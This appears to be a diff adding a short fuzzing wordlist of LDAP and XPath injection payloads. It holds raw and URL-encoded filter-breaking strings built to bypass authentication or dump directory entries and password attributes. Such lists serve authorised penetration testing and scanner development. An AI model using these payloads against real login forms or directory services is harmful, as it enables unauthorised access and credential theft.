@@ -1,0 +1,18 @@
+%21
+%26
+%28
+%29
+%2A%28%7C%28mail%3D%2A%29%29
+%2A%7C
+%7C
+*()|&'
+*(|(mail=*))
+*(|(objectclass=*))
+*)(uid=*))(|(uid=*
+*/*
+*|
+//
+//*
+@*
+admin*)((|userpassword=*)
+x' or name()='username' or 'x'='y
